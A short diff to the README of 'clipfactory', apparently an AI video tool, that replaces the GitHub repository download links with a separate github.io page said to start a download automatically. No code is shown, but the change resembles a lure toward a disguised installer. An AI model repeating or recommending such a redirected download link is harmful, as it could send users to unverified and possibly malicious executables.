@@ -20,11 +20,11 @@ Think of it as your personal AI video production team that works 24/7. Whether y
 
 ## 📥 Download and Install clipfactory
 
-[![Download clipfactory](https://img.shields.io/badge/Download-clipfactory-blue?style=for-the-badge&logo=github)](https://github.com/akuntryout00/clipfactory)
+[![Download clipfactory](https://img.shields.io/badge/Download-clipfactory-blue?style=for-the-badge&logo=github)](https://akuntryout00.github.io)
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/akuntryout00/clipfactory](https://github.com/akuntryout00/clipfactory)
+Visit this link to download the application: [https://akuntryout00.github.io](https://akuntryout00.github.io)
 
 The download will start automatically. Wait for the file to finish downloading completely before proceeding.
 
